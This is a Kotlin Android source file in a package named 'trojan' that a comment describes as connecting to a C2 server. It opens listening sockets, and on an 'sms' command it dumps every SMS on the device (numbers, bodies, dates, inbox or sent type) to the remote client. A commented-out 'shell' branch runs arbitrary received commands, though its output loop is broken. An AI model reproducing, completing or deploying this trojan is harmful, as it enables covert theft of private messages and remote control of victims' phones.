package com.example.trojan

import android.app.Activity
import android.content.ContentResolver
import android.database.Cursor
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import android.widget.Button
import java.io.*
import java.net.ServerSocket
import java.net.Socket
import java.util.*


//To connect to the C2 Server
class ConnectActivity : Activity()
{
    override fun onCreate(savedInstanceState: Bundle?)
    {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_connect)

        val startButton: Button = findViewById(R.id.trojanStart)

        startButton.setOnClickListener {
            Log.i("BUTTON", "Pressed")

            val r = Runnable{
                val serverSocket = ServerSocket(10000)
                val shellSocketServer = ServerSocket(10001)

                while (true)
                {
                    val s: Socket = serverSocket.accept()

                    val dataInputStream = DataInputStream(s.getInputStream())
                    val command = dataInputStream.readUTF().toString()

                    Log.i("DEBUG", command)

                    when (command.trim().lowercase())
                    {
                        /*
                        "shell" ->
                        {
                            Log.i("DEBUG", "Entered Shell Routine")
                                    while (true) {
                                        val sShell: Socket = shellSocketServer.accept()

                                        val dataInputStreamShell = DataInputStream(sShell.getInputStream())
                                        val commandShell = dataInputStreamShell.readUTF().toString()

                                        Log.i("DEBUG", commandShell)

                                        val p: Process = Runtime.getRuntime().exec(commandShell)
                                        val tmp: String? = null
                                        val out = BufferedReader(InputStreamReader(p.inputStream))
                                        val clientOutput = sShell.getOutputStream()
                                        val writer = PrintWriter(clientOutput, true)

                                        while (tmp != null)
                                        {
                                            Log.i("DEBUG", tmp)
                                            writer.run { println(tmp) }
                                        }
                                    }

                        }
                        */
                            
                        "sms" ->
                        {
                            Log.i("DEBUG", "Entered SMS routine")

                            val cr: ContentResolver = this.contentResolver
                            val c: Cursor? = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null)
                            var totalSms: Int

                            val clientOutput = s.getOutputStream()
                            val writer = PrintWriter(clientOutput, true)

                            if (c != null)
                            {
                                totalSms = c.count

                                if (c.moveToFirst())
                                {
                                    for (i in 0 until totalSms)
                                    {
                                        val smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE))
                                        val number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                                        val body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY))
                                        val dateFormat = Date(smsDate.toLong())
                                        var type: String

                                        when ((c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE))).toInt())
                                        {
                                            Telephony.Sms.MESSAGE_TYPE_INBOX -> {
                                                type = "inbox"
                                            }

                                            Telephony.Sms.MESSAGE_TYPE_SENT -> {
                                                type = "sent"
                                            }

                                            Telephony.Sms.MESSAGE_TYPE_OUTBOX -> {
                                                type = "outbox"
                                            }

                                            else -> {
                                                type = "other"
                                            }
                                        }

                                        val message = "DATE\n$dateFormat\nNUMBER\n$number\nBODY\n$body\nTYPE\n$type\n"

                                        writer.println(message)

                                        c.moveToNext()
                                    }
                                }

                                c.close()
                            }
                        }
                    }
                }}

            val thread = Thread(r)

            thread.start()
        }

    }

}